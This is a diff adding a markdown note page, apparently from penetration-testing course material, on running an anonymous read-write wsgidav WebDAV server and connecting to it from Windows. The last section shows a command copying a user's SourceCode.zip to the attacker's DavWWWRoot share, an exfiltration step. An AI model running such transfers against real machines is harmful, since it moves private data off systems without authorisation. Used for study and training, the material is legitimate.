@@ -1,0 +1,97 @@
+---
+layout:
+  width: default
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: false
+---
+
+# wsgidav
+
+| Download                                                             |
+| -------------------------------------------------------------------- |
+| [https://github.com/mar10/wsgidav](https://github.com/mar10/wsgidav) |
+
+A generic and extendable [WebDAV](http://www.ietf.org/rfc/rfc4918.txt) server based on [WSGI](http://www.python.org/dev/peps/pep-3333/).
+
+## WebDav Server Setup
+
+To set up a WebDav server, install two Python modules: **wsgidav** and **cheroot**. After installing them, run the wsgidav application in the target directory.
+
+### Install WebDav Python Modules
+
+```bash
+clue@machine[/]$ sudo pip3 install wsgidav cheroot
+
+[sudo] password for plaintext: 
+Collecting wsgidav
+  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
+     |████████████████████████████████| 171 kB 1.4 MB/s
+     ...SNIP...
+```
+
+### Using the WebDav Python Module
+
+```bash
+clue@htb[/]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+
+[sudo] password for plaintext: 
+Running without configuration file.
+10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
+10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
+10:02:53.950 - INFO    : Property manager:  None
+10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
+10:02:53.950 - INFO    : Registered DAV providers by route:
+10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
+10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
+10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
+10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
+```
+
+### Connecting to the Webdav Share
+
+Now we can attempt to connect to the share using the **DavWWWRoot** directory.
+
+Windows file transfer example:
+
+```powershell
+C:\htb> dir \\192.168.49.128\DavWWWRoot
+
+ Volume in drive \\192.168.49.128\DavWWWRoot has no label.
+ Volume Serial Number is 0000-0000
+
+ Directory of \\192.168.49.128\DavWWWRoot
+
+05/18/2022  10:05 AM    <DIR>          .
+05/18/2022  10:05 AM    <DIR>          ..
+05/18/2022  10:05 AM    <DIR>          sharefolder
+05/18/2022  10:05 AM                13 filetest.txt
+               1 File(s)             13 bytes
+               3 Dir(s)  43,443,318,784 bytes free
+```
+
+| Note                                                                                                                                                                                                                                                           |
+| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server. |
+| You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder                                                                                                    |
+
+## SMB File Transfer
+
+```powershell
+C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+```
+
+| Note                                                                                                                          |
+| ----------------------------------------------------------------------------------------------------------------------------- |
+| If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations. |
